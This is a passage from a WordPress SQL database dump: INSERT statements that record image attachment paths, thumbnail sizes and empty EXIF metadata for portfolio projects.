INSERT INTO `cmrfu_postmeta` VALUES("1758","872","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/82.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"82-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"82-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"82-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"82-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"82-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"82-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1759","166","er_leaf_project_images","869");
INSERT INTO `cmrfu_postmeta` VALUES("1760","166","er_leaf_project_images","870");
INSERT INTO `cmrfu_postmeta` VALUES("1761","166","er_leaf_project_images","871");
INSERT INTO `cmrfu_postmeta` VALUES("1762","166","er_leaf_project_images","872");
INSERT INTO `cmrfu_postmeta` VALUES("1763","166","_wp_old_slug","coloful");
INSERT INTO `cmrfu_postmeta` VALUES("1766","874","_wp_attached_file","2013/10/23.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1767","874","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/23.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"23-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"23-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"23-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"23-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"23-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"23-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1768","875","_wp_attached_file","2013/10/32.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1769","875","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/32.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"32-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"32-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"32-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"32-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"32-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"32-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1770","876","_wp_attached_file","2013/10/64.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1771","876","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/64.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"64-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"64-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"64-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"64-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"64-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"64-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1772","877","_wp_attached_file","2013/10/83.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1773","877","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/83.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"83-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"83-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"83-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"83-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"83-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"83-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1774","168","er_leaf_project_images","874");
INSERT INTO `cmrfu_postmeta` VALUES("1775","168","er_leaf_project_images","875");
INSERT INTO `cmrfu_postmeta` VALUES("1776","168","er_leaf_project_images","876");
INSERT INTO `cmrfu_postmeta` VALUES("1777","168","er_leaf_project_images","877");
INSERT INTO `cmrfu_postmeta` VALUES("1778","168","_wp_old_slug","uni-building");
INSERT INTO `cmrfu_postmeta` VALUES("1788","885","_wp_attached_file","2013/10/93.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1789","885","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/93.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"93-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"93-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"93-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"93-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"93-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"93-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1790","886","_wp_attached_file","2013/10/103.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1791","886","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:15:\"2013/10/103.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"103-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"103-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"103-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"103-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"103-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"103-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1792","162","er_leaf_project_images","883");
INSERT INTO `cmrfu_postmeta` VALUES("1793","162","er_leaf_project_images","884");
INSERT INTO `cmrfu_postmeta` VALUES("1794","162","er_leaf_project_images","885");
INSERT INTO `cmrfu_postmeta` VALUES("1795","162","er_leaf_project_images","886");
INSERT INTO `cmrfu_postmeta` VALUES("1796","162","_wp_old_slug","body-art");
INSERT INTO `cmrfu_postmeta` VALUES("1797","887","_wp_attached_file","2013/10/34.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1798","887","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/34.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"34-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"34-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"34-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"34-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"34-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"34-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1799","888","_wp_attached_file","2013/10/15.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1800","888","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/15.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"15-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"15-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"15-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"15-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"15-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"15-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1801","889","_wp_attached_file","2013/10/24.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1802","889","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/24.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"24-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"24-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"24-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"24-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"24-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"24-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1803","890","_wp_attached_file","2013/10/71.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1804","890","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/71.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"71-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"71-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"71-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"71-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"71-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"71-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1805","891","_wp_attached_file","2013/10/104.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1806","891","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:15:\"2013/10/104.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"104-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"104-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"104-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"104-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"104-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"104-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1807","892","_wp_attached_file","2013/10/16.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1808","892","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/16.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"16-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"16-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"16-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"16-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"16-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"16-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1809","159","er_leaf_project_images","888");
INSERT INTO `cmrfu_postmeta` VALUES("1810","159","er_leaf_project_images","889");
INSERT INTO `cmrfu_postmeta` VALUES("1811","159","er_leaf_project_images","890");
INSERT INTO `cmrfu_postmeta` VALUES("1812","159","er_leaf_project_images","891");
INSERT INTO `cmrfu_postmeta` VALUES("1813","159","_wp_old_slug","minicard");
INSERT INTO `cmrfu_postmeta` VALUES("1814","893","_wp_attached_file","2013/10/66.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1815","893","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/66.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"66-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"66-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"66-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"66-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"66-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"66-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1816","894","_wp_attached_file","2013/10/84.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1817","894","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/84.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"84-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"84-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"84-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"84-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"84-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"84-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1818","895","_wp_attached_file","2013/10/94.jpg");
